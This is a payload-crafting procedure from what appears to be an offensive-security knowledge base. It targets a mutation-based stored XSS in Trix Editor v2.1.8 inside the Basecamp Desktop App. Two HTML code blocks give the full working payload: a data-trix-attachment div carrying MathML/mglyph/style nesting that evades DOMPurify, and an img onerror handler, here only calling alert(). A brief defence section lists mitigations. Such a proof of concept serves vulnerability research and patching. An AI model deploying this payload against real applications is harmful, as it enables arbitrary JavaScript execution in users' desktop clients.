---
tags:
  - xss
  - payload-crafting
  - trix-editor
type: procedure
tools:
  - '[[tools/Trix-Editor]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/copy-payload-html]]'
  - '[[commands/decoded-mathml-xss]]'
verified: false
platforms:
  - Web
submitted: true
techniques:
  - '[[JavaScript]]'
sub_techniques: []
id: 4db0f4fe-c13b-474d-a141-2f34689273b6
created_at: '2025-12-13T23:55:06.772Z'
updated_at: '2025-12-13T23:55:06.772Z'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-XSS-Payload-HTML-for-Trix-Editor

## Summary

This procedure crafts an HTML payload exploiting a mutation-based stored XSS in Trix Editor v2.1.8 by embedding mutated MathML elements that bypass the sanitizer during copy-paste operations.

## Description

The attack targets the Trix Editor's handling of copy-paste content, where MathML mutations allow embedding malicious img tags with onerror handlers. The payload is structured as a div with data-trix-attachment JSON containing the mutated content, which evades DOMPurify sanitization. This leads to arbitrary JavaScript execution in the Basecamp Desktop App context.

## Requirements

1. Local HTML file editor or browser
2. Knowledge of Trix Editor internals (v2.1.8)
3. Target: Basecamp Desktop App with Trix integration

## Defense

Defensive measures and detection strategies:

- Update Trix Editor to latest version with improved sanitizer (DOMPurify 3.2.0+ with RETURN_DOM: true)
- Disable copy-paste of HTML in rich editors or use strict content policies
- Monitor for anomalous JavaScript execution in Electron apps

## Objectives

1. Generate copyable payload for XSS bypass
2. Ensure mutation evades sanitizer
3. Prepare for paste into Trix Editor

## Instructions

### Step 1: Create HTML File

**Context**: Build the base HTML structure with the encoded payload.

**Command** ([[commands/copy-payload-html]]):
```html
<!DOCTYPE html><html><body><div data-trix-attachment="{\"contentType\":\"text/html5\",\"content\":\"&lt;math&gt;&lt;mtext&gt;&lt;table&gt;&lt;mglyph&gt;&lt;style&gt;&lt;img src=x onerror=alert()&gt;&lt;/style&gt;XSSPOC\"}"></div>copy me</body></html>
```

> This creates an HTML file that displays 'copy me' while embedding the JSON-encoded MathML mutation. Save and open in browser.

### Step 2: Verify Payload

**Context**: Decode and inspect the inner payload using [[commands/decoded-mathml-xss]].

**Command** ([[commands/decoded-mathml-xss]]):
```html
<math><mtext><table><mglyph><style><img src=x onerror=alert()></style>XSSPOC</mglyph></table></mtext></math>
```

> Expected: Confirms the img onerror structure for JavaScript execution on paste.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/copy-payload-html]]
- [[commands/decoded-mathml-xss]]

## Tools Used

- [[tools/Trix-Editor]]

## Tags

- [[xss]]
- [[payload-crafting]]
